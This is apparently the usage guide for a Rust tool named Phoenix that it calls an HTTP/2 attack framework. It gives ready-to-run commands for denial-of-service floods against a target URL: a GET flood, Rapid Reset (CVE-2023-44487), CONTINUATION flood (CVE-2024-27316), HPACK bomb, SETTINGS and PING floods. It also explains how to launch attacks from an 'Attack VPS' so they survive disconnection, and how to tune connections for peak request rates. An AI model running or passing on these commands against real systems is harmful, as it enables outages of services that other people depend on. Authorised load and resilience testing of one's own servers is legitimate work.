# Phoenix HTTP/2 Attack Framework — Usage Guide

## Quick Start

```bash
# Build
source "$HOME/.cargo/env"
cargo build --release

# Binary location
./target/release/phoenix
```

---

## Commands

### Load Test (Universal)
Hammers target with maximum HTTP/2 GET requests using all CPU cores.

```bash
phoenix attack universal \
  --target https://<host>/path \
  --connections <N> \
  --duration <time>
```

**Parameters:**
| Flag | Description | Recommended |
|------|-------------|-------------|
| `--connections` | TCP connections per core | 50–150 |
| `--duration` | Attack duration (e.g. `300s`, `10m`) | `600s` |

**Architecture:**
```
N cores × C connections × 64 streams = concurrent requests
Example: 24 cores × 150 conns × 64 streams = 230,400 concurrent
```

**Examples:**
```bash
# Moderate load
phoenix attack universal --target https://target.com/index.html --connections 50 --duration 300s

# High load
phoenix attack universal --target https://target.com/index.html --connections 75 --duration 600s

# Maximum load
phoenix attack universal --target https://target.com/index.html --connections 150 --duration 600s
```

---

### Rapid Reset (CVE-2023-44487)
Sends HEADERS + immediate RST_STREAM (CANCEL) to exhaust server stream processing.

```bash
phoenix attack universal-reset \
  --target https://<host>/path \
  --connections <N> \
  --duration <time>
```

---

### Other Attacks

```bash
# Ping Flood
phoenix attack ping-flood --target https://<host> --connections 50 --duration 300s

# Settings Flood
phoenix attack settings-flood --target https://<host> --connections 50 --duration 300s

# HPACK Bomb
phoenix attack hpack-bomb --target https://<host> --connections 10 --duration 60s

# Continuation Flood
phoenix attack continuation-flood --target https://<host> --connections 10 --duration 60s
```

---

## Running on Attack VPS

### Launch (survives SSH disconnect)
```bash
setsid phoenix attack universal \
  --target https://TARGET_IP/index.html \
  --connections 150 \
  --duration 600s \
  </dev/null >/tmp/attack.log 2>&1 & disown $!
```

### Check if running
```bash
ps aux | grep 'phoenix attack' | grep -v grep
```

### Monitor logs
```bash
tail -f /tmp/attack.log
```

### Stop
```bash
pkill phoenix
```

---

## Tuning Guide

| Connections | Streams | RPS Range | Notes |
|-------------|---------|-----------|-------|
| 50 | 64 | ~24–39k | Stable, clean handshakes |
| 75 | 64 | ~40k | Sweet spot |
| 100 | 64 | ~40k | Diminishing returns |
| 150 | 64 | ~40k+ | TLS handshake overhead at startup |
| 200+ | 64 | Drops | Too many simultaneous TLS handshakes |

**Key insight:** More connections ≠ more RPS after a certain point. TLS handshake cost at startup limits effective concurrency. Tune `--connections` between 50–150 for best results.

---

## Dashboard

Target analytics dashboard: `https://<target-ip>/dashboard`

Metrics:
- **REQ/SEC (EMA)** — live requests per second (exponential moving average α=0.3)
- **Peak** — maximum RPS achieved
- **p50 / p95 / p99** — latency percentiles
- **Attack Alert** — triggers when RPS > 200

---

## Architecture

```
phoenix-core        TLS connections, HTTP/2 raw frames
phoenix-attacks     Attack modules (universal, rapid-reset, ping-flood, etc.)
phoenix-metrics     Real-time metrics collection
phoenix-report      HTML/JSON report generation
phoenix-cli         CLI entrypoint
```

---

## CVE Modules

| Module | CVE | Description |
|--------|-----|-------------|
| `universal` | — | High-throughput load test |
| `universal-reset` | CVE-2023-44487 | Rapid Reset attack |
| `rapid-reset` | CVE-2023-44487 | Raw frame RST flood |
| `continuation-flood` | CVE-2024-27316 | CONTINUATION frame flood |
| `hpack-bomb` | — | HPACK header decompression bomb |
| `settings-flood` | — | SETTINGS frame flood |
| `ping-flood` | — | PING frame flood |
